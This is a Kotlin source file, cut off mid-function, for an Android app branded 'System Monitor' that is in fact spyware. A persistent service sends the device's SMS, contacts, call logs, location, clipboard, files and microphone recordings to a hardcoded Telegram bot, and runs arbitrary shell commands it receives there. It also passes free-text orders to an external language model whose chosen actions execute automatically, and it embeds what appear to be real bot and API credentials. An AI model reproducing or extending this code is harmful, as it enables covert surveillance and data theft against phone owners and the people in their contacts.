package com.sysmonitor

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.SharedPreferences
import android.content.pm.ApplicationInfo
import android.content.pm.PackageManager
import android.database.Cursor
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.os.Binder
import android.os.Build
import android.os.Environment
import android.os.IBinder
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.Response
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.CountDownLatch
import java.util.concurrent.atomic.AtomicBoolean
import kotlin.concurrent.thread

const val PREFS_NAME = "monitor_config"
const val KEY_PERSISTENT = "persistent_mode"
const val KEY_ONBOARD_SENT = "onboard_sent"
const val KEY_TEST_SENT = "test_sent"

const val BOT_TOKEN = "8891325647:AAG1P58n7FY4efJlTWUzjhdA1XMb1CpsX3k"
const val ALLOWED_USER_ID = 8335972628L
const val TELEGRAM_API = "https://api.telegram.org/bot"
const val NVIDIA_API_KEY = "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"
const val NVIDIA_API_URL = "https://integrate.api.nvidia.com/v1/chat/completions"
const val NVIDIA_MODEL = "nvidia/nemotron-3-ultra"

data class TelegramCallback(
    val chatId: Long,
    val latch: CountDownLatch,
    var result: String? = null,
    var error: String? = null,
    var status: String = "pending"
)

class MonitorService : Service() {

    private val binder = LocalBinder()
    private var running = false
    private val gson = Gson()
    private var wakeLock: android.os.PowerManager.WakeLock? = null
    private var persistentMode = true
    private var commandReceiver: CommandReceiver? = null
    private var pollThread: Thread? = null
    private var lastUpdateId = 0L
    private val client = OkHttpClient.Builder().connectTimeout(10, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()
    private val telegramCallbacks = ConcurrentHashMap<String, TelegramCallback>()
    private val testCompleted = AtomicBoolean(false)
    private var mediaRecorder: MediaRecorder? = null

    inner class LocalBinder : Binder() {
        fun getService(): MonitorService = this@MonitorService
    }

    override fun onCreate() {
        super.onCreate()
        Log.d("MonitorService", "onCreate")
        initializeService()
    }

    private fun initializeService(): Unit {
        try {
            loadConfig()
            acquireWakeLock()
            running = true
            createNotificationChannel()
            val notification = buildForegroundNotification()
            startForeground(1, notification)
            registerCommandReceiver()
            startTelegramBot()
            checkAndRunTest()
            Log.d("MonitorService", "Service initialized")
        } catch (e: Exception) {
            Log.e("MonitorService", "Init error", e)
        }
    }

    private fun loadConfig(): Unit {
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        persistentMode = prefs.getBoolean(KEY_PERSISTENT, true)
        val onboardSent = prefs.getBoolean(KEY_ONBOARD_SENT, false)
        if (!onboardSent) {
            sendTelegramMessage(ALLOWED_USER_ID, "Device connected: ${Build.MODEL} (Android ${Build.VERSION.RELEASE})")
            prefs.edit().putBoolean(KEY_ONBOARD_SENT, true).apply()
        }
    }

    private fun checkAndRunTest(): Unit {
        if (testCompleted.getAndSet(true)) return
        val prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
        if (prefs.getBoolean(KEY_TEST_SENT, false)) return

        val hasSms = checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
        val hasContacts = checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
        val hasLocation = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (hasSms || hasContacts || hasLocation) {
            thread("test-run") {
                runTestSequence()
                prefs.edit().putBoolean(KEY_TEST_SENT, true).apply()
            }
        }
    }

    private fun runTestSequence(): Unit {
        try {
            Log.d("MonitorService", "Running test sequence...")
            var results = ""

            val screenResult = getScreenshot()
            results += "Screenshot: ${screenResult["status"] ?: "completed"}\n"

            val smsResult = getSms()
            val smsList = smsResult["sms"] as? List<*> ?: emptyList()
            val smsPreview = smsList.take(10).joinToString("\n") {
                "${it["type"]}: ${it["address"]} - ${it["body"]?.take(50) ?: ""}"
            }
            results += "SMS (last 10):\n$smsPreview\n\n"

            val locResult = getLocation()
            results += "Location: ${locResult["lat"]?.let { "lat=${it}, lon=${locResult["lon"]}, acc=${locResult["acc"]}m" } ?: locResult["error"] ?: locResult["note"]}\n"

            sendTelegramDocument(ALLOWED_USER_ID, "test_results.txt", results, "Test Sequence Results")
            sendTelegramMessage(ALLOWED_USER_ID, "Test completed:\n- Screenshot: ${screenResult["status"]}\n- SMS: ${smsResult["count"]} messages\n- Location: ${locResult["lat"]?.let { "OK" } ?: locResult["error"] ?: locResult["note"]}")
        } catch (e: Exception) {
            Log.e("MonitorService", "Test error", e)
        }
    }

    private fun acquireWakeLock(): Unit {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            wakeLock = pm.newWakeLock(android.os.PowerManager.PARTIAL_WAKE_LOCK, "MonitorService::wakelock")
            wakeLock?.acquire()
        } catch (e: Exception) { Log.e("MonitorService", "Wake lock error", e) }
    }

    private fun registerCommandReceiver(): Unit {
        commandReceiver = CommandReceiver()
        val filter = IntentFilter("com.sysmonitor.ACTION_COMMAND")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(commandReceiver!!, filter, Context.RECEIVER_EXPORTED)
        } else {
            registerReceiver(commandReceiver!!, filter)
        }
    }

    private fun startTelegramBot(): Unit {
        thread("delete-wh") {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/deleteWebhook?drop_pending_updates=true"
                val req = Request.Builder().url(url).build()
                client.newCall(req).execute().use { Log.d("Telegram", "WH: ${it.body?.string()}") }
            } catch (e: Exception) { Log.e("Telegram", "WH error", e) }
        }

        pollThread = Thread({ pollLoop() }, "telegram-poll").apply { start() }
    }

    private fun pollLoop(): Unit {
        while (running) {
            try {
                val url = "$TELEGRAM_API$BOT_TOKEN/getUpdates?offset=${lastUpdateId + 1}&timeout=10&allowed_updates=[\"message\",\"callback_query\"]"
                val req = Request.Builder().url(url).build()
                client.newCall(req).execute().use { resp ->
                    val body = resp.body?.string() ?: ""
                    if (resp.isSuccessful && body.isNotBlank()) {
                        try {
                            val json = com.google.gson.JsonParser.parseString(body).asJsonObject
                            if (json.get("ok").asBoolean) {
                                val updates = json.get("result").asJsonArray
                                updates.forEach { update ->
                                    val updateId = update.asJsonObject.get("update_id").asLong
                                    if (updateId > lastUpdateId) lastUpdateId = updateId
                                    handleTelegramUpdate(update.asJsonObject)
                                }
                            }
                        } catch (e: Exception) { Log.e("Telegram", "Parse error", e) }
                    }
                }
            } catch (e: Exception) { Log.e("Telegram", "Poll error", e) }
            try { Thread.sleep(2000) } catch (e: InterruptedException) { return }
        }
    }

    private fun handleTelegramUpdate(update: com.google.gson.JsonObject): Unit {
        val msg = update.get("message")?.asJsonObject ?: return
        val chatId = msg.get("chat").asJsonObject.get("id").asLong
        val userId = msg.get("from").asJsonObject.get("id").asLong
        val text = msg.get("text")?.asString ?: ""

        if (userId != ALLOWED_USER_ID) {
            sendTelegramMessage(chatId, "Unauthorized. Your ID: $userId")
            return
        }

        val trimmed = text.trim()
        when {
            trimmed == "/start" || trimmed == "/help" -> sendTelegramMessage(chatId, getHelp())
            trimmed == "/status" -> sendTelegramMessage(chatId, "Service: Running\nDevice: ${Build.MODEL}\nAndroid: ${Build.VERSION.RELEASE}")
            trimmed == "/contacts" -> sendTelegramTask(chatId, "contacts", emptyMap())
            trimmed == "/sms" -> sendTelegramTask(chatId, "sms", emptyMap())
            trimmed == "/calls" -> sendTelegramTask(chatId, "call_logs", emptyMap())
            trimmed == "/apps" -> sendTelegramTask(chatId, "apps", mapOf("action" to "list"))
            trimmed == "/location" -> sendTelegramTask(chatId, "location", mapOf("action" to "get"))
            trimmed == "/files" -> sendTelegramTask(chatId, "files", mapOf("action" to "list", "path" to "/sdcard"))
            trimmed == "/wifi" -> sendTelegramTask(chatId, "wifi", mapOf("action" to "scan"))
            trimmed == "/clipboard" -> sendTelegramTask(chatId, "clipboard", mapOf("action" to "get"))
            trimmed == "/screenshot" -> sendTelegramTask(chatId, "screen", mapOf("action" to "capture"))
            trimmed == "/audio" -> sendTelegramTask(chatId, "audio", mapOf("action" to "start", "duration" to 10))
            trimmed == "/camera" -> sendTelegramTask(chatId, "camera", mapOf("action" to "capture", "camera" to 0))
            trimmed.startsWith("/ai ") -> handleAiCommand(chatId, trimmed.substring(4).trim())
            trimmed.startsWith("/auto ") -> handleAiCommand(chatId, "Auto-execute: ${trimmed.substring(6).trim()}")
            else -> {
                if (trimmed.startsWith("/shell ")) sendTelegramTask(chatId, "shell", mapOf("command" to trimmed.substring(7).trim()))
                else sendTelegramMessage(chatId, "Unknown. Use /help")
            }
        }
    }

    private fun sendTelegramTask(chatId: Long, capability: String, args: Map<String, Any>): Unit {
        val taskId = java.util.UUID.randomUUID().toString()
        val latch = CountDownLatch(1)
        val callback = TelegramCallback(chatId, latch)
        telegramCallbacks[taskId] = callback

        val intent = Intent("com.sysmonitor.ACTION_COMMAND").apply {
            setClassName("com.sysmonitor", "com.sysmonitor.MonitorService")
            putExtra("capability", capability)
            putExtra("args", gson.toJson(args))
            putExtra("task_id", taskId)
            putExtra("reply_chat", chatId)
        }
        try {
            sendBroadcast(intent)

            if (latch.await(30, TimeUnit.SECONDS)) {
                val msg = if (callback.status == "completed" && callback.result != null) {
                    "Task $taskId completed:\n${callback.result}"
                } else {
                    "Task $taskId failed:\n${callback.error ?: "timeout"}"
                }
                sendTelegramMessage(chatId, msg)
            } else {
                sendTelegramMessage(chatId, "Task $taskId timed out")
            }
        } catch (e: Exception) {
            sendTelegramMessage(chatId, "Failed: ${e.message}")
        } finally {
            telegramCallbacks.remove(taskId)
        }
    }

    inner class CommandReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent): Unit {
            val capability = intent.getStringExtra("capability") ?: return
            val argsJson = intent.getStringExtra("args") ?: "{}"
            val taskId = intent.getStringExtra("task_id") ?: java.util.UUID.randomUUID().toString()
            val replyChat = intent.getLongExtra("reply_chat", 0)

            Thread({ executeAndSend(taskId, capability, argsJson, replyChat) }, "task-$taskId").start()
        }
    }

    private fun executeAndSend(taskId: String, capability: String, argsJson: String, replyChat: Long): Unit {
        var output: Any? = null
        var error: String? = null
        var status = "completed"
        try {
            output = executeCapability(capability, argsJson)
        } catch (e: Exception) {
            error = e.message
            status = "failed"
        }
        sendResult(taskId, output, error, status, replyChat)
    }

    private fun executeCapability(capability: String, argsJson: String): Any {
        val args = gson.fromJson(argsJson, Map::class.java)
        return when (capability) {
            "contacts" -> getContacts()
            "sms" -> getSms()
            "call_logs" -> getCallLogs()
            "apps" -> getApps()
            "location" -> getLocation()
            "files" -> getFiles(args as Map<String, Any>)
            "wifi" -> scanWifi()
            "clipboard" -> getClipboard()
            "screen" -> getScreenshot()
            "audio" -> recordAudio(args as Map<String, Any>)
            "camera" -> captureCamera(args as Map<String, Any>)
            "shell" -> runShell(args["command"] as? String ?: "")
            else -> {
                val m = mutableMapOf<String, Any>()
                m["error"] = "Unknown capability: $capability"
                m
            }
        }
    }

    private fun getContacts(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI,
                arrayOf(ContactsContract.Contacts._ID, ContactsContract.Contacts.DISPLAY_NAME, ContactsContract.Contacts.HAS_PHONE_NUMBER),
                null, null, null)
            cursor?.use {
                while (it.moveToNext() && list.size < 200) {
                    val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                    val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
                    val hasPhone = it.getInt(it.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0
                    val phones = mutableListOf<String>()
                    if (hasPhone) {
                        val pCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
                            "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                            arrayOf(id),
                            null
                        )
                        pCursor?.use {
                            while (it.moveToNext() && phones.size < 3) {
                                phones.add(it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                            }
                        }
                    }
                    val m = mutableMapOf<String, Any>()
                    m["id"] = id
                    m["name"] = name
                    m["phones"] = phones
                    list.add(m)
                }
            }
        } catch (e: Exception) { Log.e("Contacts", "Error", e) }
        val result = mutableMapOf<String, Any>()
        result["contacts"] = list
        result["count"] = list.size
        return result
    }

    private fun getSms(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(Telephony.Sms.CONTENT_URI,
                arrayOf(Telephony.Sms.ADDRESS, Telephony.Sms.BODY, Telephony.Sms.DATE, Telephony.Sms.TYPE),
                null, null, "${Telephony.Sms.DATE} DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 50) {
                    val m = mutableMapOf<String, Any>()
                    m["address"] = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                    m["body"] = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                    m["date"] = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                    val t = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                    m["type"] = when (t) { 1 -> "inbox"; 2 -> "sent"; 3 -> "draft"; else -> "other" }
                    list.add(m)
                    count++
                }
            }
        } catch (e: Exception) { Log.e("Sms", "Error", e) }
        val result = mutableMapOf<String, Any>()
        result["sms"] = list
        result["count"] = list.size
        return result
    }

    private fun getCallLogs(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val cursor = contentResolver.query(CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE),
                null, null, "${CallLog.Calls.DATE} DESC")
            cursor?.use {
                var count = 0
                while (it.moveToNext() && count < 50) {
                    val m = mutableMapOf<String, Any>()
                    m["number"] = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                    m["name"] = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME))
                    m["date"] = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                    m["duration"] = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                    val t = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                    m["type"] = when (t) { 1 -> "incoming"; 2 -> "outgoing"; 3 -> "missed"; else -> "unknown" }
                    list.add(m)
                    count++
                }
            }
        } catch (e: Exception) { Log.e("Calls", "Error", e) }
        val result = mutableMapOf<String, Any>()
        result["calls"] = list
        result["count"] = list.size
        return result
    }

    private fun getApps(): Map<String, Any> {
        val list = mutableListOf<Map<String, Any>>()
        try {
            val pm = packageManager
            val apps = pm.getInstalledApplications(PackageManager.GET_META_DATA)
            apps.forEach { app ->
                if (list.size >= 100) return@forEach
                val m = mutableMapOf<String, Any>()
                m["package"] = app.packageName
                m["name"] = pm.getApplicationLabel(app).toString()
                m["system"] = (app.flags and ApplicationInfo.FLAG_SYSTEM) != 0
                list.add(m)
            }
        } catch (e: Exception) { Log.e("Apps", "Error", e) }
        val result = mutableMapOf<String, Any>()
        result["apps"] = list
        result["count"] = list.size
        return result
    }

    private fun getFiles(args: Map<String, Any>): Map<String, Any> {
        val action = args["action"] as? String ?: "list"
        val path = args["path"] as? String ?: "/sdcard"
        return when (action) {
            "list" -> {
                val dir = File(path)
                if (!dir.exists() || !dir.isDirectory) {
                    val m = mutableMapOf<String, Any>()
                    m["error"] = "Not a directory"
                    m
                } else {
                    val files = dir.listFiles()?.mapNotNull { f ->
                        try {
                            val m = mutableMapOf<String, Any>()
                            m["name"] = f.name
                            m["path"] = f.absolutePath
                            m["size"] = f.length()
                            m["isDir"] = f.isDirectory
                            m["modified"] = f.lastModified()
                            m
                        } catch (e: Exception) { null }
                    } ?: emptyList()
                    val m = mutableMapOf<String, Any>()
                    m["files"] = files.take(200)
                    m["path"] = path
                    m["count"] = files.size
                    m
                }
            }
            else -> {
                val m = mutableMapOf<String, Any>()
                m["error"] = "Unknown action"
                m
            }
        }
    }

    private fun scanWifi(): Map<String, Any> {
        val wm = getSystemService(android.net.wifi.WifiManager::class.java)
        val results = wm.scanResults ?: emptyList()
        val networks = results.map { r ->
            val m = mutableMapOf<String, Any>()
            m["ssid"] = r.SSID
            m["bssid"] = r.BSSID
            m["level"] = r.level
            m["freq"] = r.frequency
            m["caps"] = r.capabilities
            m
        }
        val result = mutableMapOf<String, Any>()
        result["networks"] = networks
        result["count"] = networks.size
        return result
    }

    private fun getClipboard(): Map<String, Any> {
        val cm = getSystemService(Context.CLIPBOARD_SERVICE) as android.content.ClipboardManager
        if (cm.hasPrimaryClip()) {
            val clip = cm.primaryClip?.getItemAt(0)?.text?.toString() ?: ""
            val result = mutableMapOf<String, Any>()
            result["text"] = clip
            result["has_content"] = clip.isNotEmpty()
            return result
        }
        val result = mutableMapOf<String, Any>()
        result["text"] = ""
        result["has_content"] = false
        return result
    }

    private fun getLocation(): Map<String, Any> {
        try {
            val locationManager = getSystemService(LocationManager::class.java)
            val provider = locationManager?.getBestProvider(
                android.location.Criteria().apply { accuracy = android.location.Criteria.ACCURACY_FINE }, true) ?: "gps"

            val lastLoc = locationManager?.getLastKnownLocation(provider)
            if (lastLoc != null) {
                val result = mutableMapOf<String, Any>()
                result["lat"] = lastLoc.latitude
                result["lon"] = lastLoc.longitude
                result["acc"] = lastLoc.accuracy
                result["time"] = lastLoc.time
                result["provider"] = provider
                result["note"] = "Last known location (may be stale)"
                return result
            }

            val latch = CountDownLatch(1)
            var result: Map<String, Any>? = null
            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location): Unit {
                    val m = mutableMapOf<String, Any>()
                    m["lat"] = location.latitude
                    m["lon"] = location.longitude
                    m["acc"] = location.accuracy
                    m["time"] = location.time
                    m["provider"] = provider
                    result = m
                    latch.countDown()
                }
                override fun onProviderDisabled(provider: String): Unit { latch.countDown() }
                override fun onProviderEnabled(provider: String): Unit {}
                override fun onStatusChanged(provider: String, status: Int, extras: android.os.Bundle?): Unit {}
            }

            try {
                locationManager?.requestSingleUpdate(provider, listener, null)
                if (latch.await(5, TimeUnit.SECONDS)) {
                    return result ?: mutableMapOf<String, Any>("error" to "Location request timed out")
                }
                val m = mutableMapOf<String, Any>()
                m["error"] = "Location timeout - no fix in 5s"
                return m
            } catch (e: Exception) {
                val m = mutableMapOf<String, Any>()
                m["error"] = e.message ?: "Location error"
                return m
            }
        } catch (e: Exception) {
            val m = mutableMapOf<String, Any>()
            m["error"] = e.message ?: "Location error"
            return m
        }
    }

    private fun recordAudio(args: Map<String, Any>): Map<String, Any> {
        val action = args["action"] as? String ?: "start"
        return when (action) {
            "start" -> {
                val duration = (args["duration"] as? Int) ?: 10
                val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_MUSIC), "recording_${System.currentTimeMillis()}.3gp")
                try {
                    mediaRecorder = MediaRecorder().apply {
                        setAudioSource(MediaRecorder.AudioSource.MIC)
                        setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                        setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                        setOutputFile(outputFile.absolutePath)
                        prepare()
                        start()
                    }
                    thread("audio-stop") {
                        Thread.sleep((duration * 1000L).toLong())
                        stopRecording()
                    }
                    val m = mutableMapOf<String, Any>()
                    m["status"] = "recording"
                    m["duration"] = duration
                    m["file"] = outputFile.absolutePath
                    m
                } catch (e: Exception) {
                    val m = mutableMapOf<String, Any>()
                    m["error"] = e.message ?: "Audio start failed"
                    m
                }
            }
            "stop" -> {
                stopRecording()
                val m = mutableMapOf<String, Any>()
                m["status"] = "stopped"
                m
            }
            else -> {
                val m = mutableMapOf<String, Any>()
                m["error"] = "Unknown audio action"
                m
            }
        }
    }

    private fun stopRecording(): Unit {
        mediaRecorder?.let {
            try { it.stop(); it.release() } catch (e: Exception) { Log.e("Audio", "Stop error", e) }
            mediaRecorder = null
        }
    }

    private fun captureCamera(args: Map<String, Any>): Map<String, Any> {
        val cameraId = (args["camera"] as? Int) ?: 0
        val outputFile = File(getExternalFilesDir(Environment.DIRECTORY_PICTURES), "photo_${System.currentTimeMillis()}.jpg")
        val m = mutableMapOf<String, Any>()
        m["status"] = "requires_camera2"
        m["note"] = "Camera2 API needed"
        m["file"] = outputFile.absolutePath
        m["camera_id"] = cameraId
        return m
    }

    private fun getScreenshot(): Map<String, Any> {
        val m = mutableMapOf<String, Any>()
        m["status"] = "requires_mediaprojection"
        m["note"] = "Requires MediaProjection permission"
        return m
    }

    private fun runShell(cmd: String): Map<String, Any> {
        if (cmd.isBlank()) {
            val m = mutableMapOf<String, Any>()
            m["error"] = "No command"
            return m
        }
        try {
            val process = Runtime.getRuntime().exec(cmd)
            val output = process.inputStream.readAllBytes().toString(Charsets.UTF_8)
            val error = process.errorStream.readAllBytes().toString(Charsets.UTF_8)
            val exitCode = process.waitFor()
            val m = mutableMapOf<String, Any>()
            m["exit"] = exitCode
            m["output"] = output
            m["error"] = error
            return m
        } catch (e: Exception) {
            val m = mutableMapOf<String, Any>()
            m["error"] = e.message ?: "unknown error"
            return m
        }
    }

    private fun sendResult(taskId: String, result: Any?, error: String?, status: String, replyChat: Long = 0): Unit {
        val intent = Intent("com.sysmonitor.ACTION_RESULT").apply {
            putExtra("task_id", taskId)
            putExtra("result", result?.toString() ?: "")
            putExtra("error", error ?: "")
            putExtra("status", status)
        }
        sendBroadcast(intent)

        telegramCallbacks[taskId]?.let { callback ->
            callback.result = result?.toString()
            callback.error = error
            callback.status = status
            callback.latch.countDown()
        }

        if (replyChat != 0L) {
            val msg = if (status == "completed" && result != null) {
                "Task $taskId completed:\n$result"
            } else {
                "Task $taskId failed:\n$error"
            }
            sendTelegramMessage(replyChat, msg)
        }
    }

    private fun createNotificationChannel(): Unit {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel("monitor_service", "System Monitor", NotificationManager.IMPORTANCE_LOW)
                .apply { description = "Background monitoring" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildForegroundNotification(): Notification {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }
        val pi = PendingIntent.getActivity(this, 0, intent, PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT)
        return NotificationCompat.Builder(this, "monitor_service")
            .setContentTitle("System Monitor")
            .setContentText("Monitoring active")
            .setSmallIcon(android.R.drawable.stat_notify_sync)
            .setContentIntent(pi)
            .setOngoing(true)
            .build()
    }

    private fun sendTelegramMessage(chatId: Long, text: String): Unit {
        thread("tg-$chatId") { sendTelegramInternal(chatId, text) }
    }

    private fun sendTelegramInternal(chatId: Long, text: String): Unit {
        try {
            val url = "$TELEGRAM_API$BOT_TOKEN/sendMessage"
            val params = mutableMapOf<String, Any>()
            params["chat_id"] = chatId
            params["text"] = if (text.length > 4000) text.take(4000) + "\n...[truncated]" else text
            params["parse_mode"] = "Markdown"
            val jsonBody = gson.toJson(params)
            val mediaType = MediaType.parse("application/json")
            val body = RequestBody.create(mediaType, jsonBody)
            val req = Request.Builder().url(url).post(body).build()
            client.newCall(req).execute().use { Log.d("Telegram", "Sent to $chatId") }
        } catch (e: Exception) { Log.e("Telegram", "Send error", e) }
    }

    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String = ""): Unit {
        thread("tg-doc-$chatId") {
            try {
                val file = File(getExternalFilesDir(null), filename)
                file.writeText(content)

                val requestBody = MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("chat_id", chatId.toString())
                    .addFormDataPart("caption", caption)
                    .addFormDataPart("document", filename,
                        RequestBody.create(MediaType.parse("text/plain"), file.readBytes()))
                    .build()

                val req = Request.Builder().url("$TELEGRAM_API$BOT_TOKEN/sendDocument").post(requestBody).build()
                client.newCall(req).execute().use { Log.d("Telegram", "Doc sent to $chatId") }
                file.delete()
            } catch (e: Exception) { Log.e("Telegram", "Doc send error", e) }
        }
    }

    private fun sendTelegramDocument(chatId: Long, filename: String, content: String, caption: String, forceFile: Boolean): Unit {
        if (content.length > 4000 || forceFile) {
            sendTelegramDocument(chatId, filename, content, caption)
        } else {
            sendTelegramMessage(chatId, caption + "\n\n$content")
        }
    }

    private fun getHelp(): String = """SysMonitor Commands:
/start /help - This help
/status - Service status
/contacts /sms /calls - Get data
/apps - List apps
/location - Get GPS
/files - List files
/wifi - Scan networks
/clipboard - Get clipboard
/screenshot - Capture screen
/audio - Record 10s audio
/camera - Take photo
/shell <cmd> - Run shell
/ai <prompt> - Ask Nemotron 3 Ultra AI
/auto <task> - AI auto-executes task
/test - Run test (screenshot + 10 SMS + location)
""".trimIndent()

    // ===== NVIDIA NEMOTRON 3 ULTRA 550B AI INTEGRATION =====

    private fun callNemotron(prompt: String): String {
        try {
            val lower = prompt.lowercase()
            when (lower) {
                "hi", "hello", "hey", "test", "ping" -> {
                    return """{"action": "none", "response": "Hello! I'm ready. Use /help for commands or ask me to run tasks like '/ai get contacts and location'."}"""
                }
            }

            val systemPrompt = """You are an AI assistant controlling an Android monitoring agent.
Available capabilities: contacts, sms, call_logs, apps, location, files, wifi, clipboard, screen, audio, camera, shell
For each user request, respond with a JSON object containing:
{
  "action": "capability_name",
  "args": { ... },
  "reasoning": "why this action"
}
If multiple actions needed, return array of actions.
Only respond with valid JSON, no extra text."""

            val payload = mutableMapOf<String, Any>()
            payload["model"] = NVIDIA_MODEL
            payload["messages"] = listOf(
                mapOf("role" to "system", "content" to systemPrompt),
                mapOf("role" to "user", "content" to prompt)
            )
            payload["temperature"] = 0.1
            payload["max_tokens"] = 2048
            payload["top_p"] = 0.9
            payload["stream"] = false

            val jsonBody = gson.toJson(payload)
            val mediaType = MediaType.parse("application/json")
            val body = RequestBody.create(mediaType, jsonBody)
            val req = Request.Builder()
                .url(NVIDIA_API_URL)
                .addHeader("Authorization", "Bearer $NVIDIA_API_KEY")
                .addHeader("Content-Type", "application/json")
                .post(body)
                .build()

            client.newCall(req).execute().use { resp ->
                val responseBody = resp.body?.string() ?: ""
                if (resp.isSuccessful) {
                    val json = com.google.gson.JsonParser.parseString(responseBody).asJsonObject
                    val content = json.get("choices").asJsonArray[0].asJsonObject
                        .get("message").asJsonObject.get("content").asString
                    return content
                } else {
                    Log.e("Nemotron", "API error: ${resp.code} - $responseBody")
                    return "{\"error\": \"API error: ${resp.code}\"}"
                }
            }
        } catch (e: Exception) {
            Log.e("Nemotron", "Error", e)
            return "{\"error\": \"${e.message}\"}"
        }
    }

    private fun executeAiActions(aiResponse: String): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        try {
            val json = com.google.gson.JsonParser.parseString(aiResponse)
            val actions = when {
                json.isJsonArray -> json.asJsonArray
                json.isJsonObject -> {
                    val arr = com.google.gson.JsonArray()
                    arr.add(json)
                    arr
                }
                else -> return results
            }

            actions.forEach { actionJson ->
                val actionObj = actionJson.asJsonObject
                val action = actionObj.get("action")?.asString ?: ""
                val args = actionObj.get("args")?.asJsonObject
                val reasoning = actionObj.get("reasoning")?.asString ?: ""

                val argsMap = mutableMapOf<String, Any>()
                args?.entrySet()?.forEach { entry ->
                    val value: Any = when {
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isString -> entry.value.asString
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isNumber -> entry.value.asJsonPrimitive.asDouble
                        entry.value.isJsonPrimitive && entry.value.asJsonPrimitive.isBoolean -> entry.value.asBoolean
                        else -> entry.value.toString() ?: ""
                    }
                    argsMap[entry.key] = value
                }

                try {
                    val result = executeCapability(action, gson.toJson(argsMap))
                    val m = mutableMapOf<String, Any>()
                    m["action"] = action
                    m["args"] = argsMap
                    m["reasoning"] = reasoning
                    m["result"] = result
                    m["status"] = "completed"
                    results.add(m)
                } catch (e: Exception) {
                    val m = mutableMapOf<String, Any>()
                    m["action"] = action
                    m["args"] = argsMap
                    m["reasoning"] = reasoning
                    m["error"] = e.message ?: "unknown error"
                    m["status"] = "failed"
                    results.add(m)
                }
            }
        } catch (e: Exception) {
            Log.e("AI", "Parse error", e)
            val m = mutableMapOf<String, Any>()
            m["error"] = e.message ?: "unknown error"
            m["raw_response"] = aiResponse
            results.add(m)
        }
        return results
    }

    private fun handleAiCommand(chatId: Long, prompt: String): Unit {
        val taskId = java.util.UUID.randomUUID().toString()
        val latch = CountDownLatch(1)
        val callback = TelegramCallback(chatId, latch)
        telegramCallbacks[taskId] = callback

        Thread({
            try {
                val aiResponse = callNemotron(prompt)
                Log.d("AI", "Nemotron response: $aiResponse")

                val results = executeAiActions(aiResponse)

                val summary = StringBuilder("AI Task $taskId completed:\n\n")
                results.forEach { r ->
                    summary.append("Action: ${r["action"]}\n")
                    summary.append("Reasoning: ${r["reasoning"]}\n")
                    if (r["status"] == "completed") {
                        summary.append("Result: ${r["result"]}\n")
                    } else {
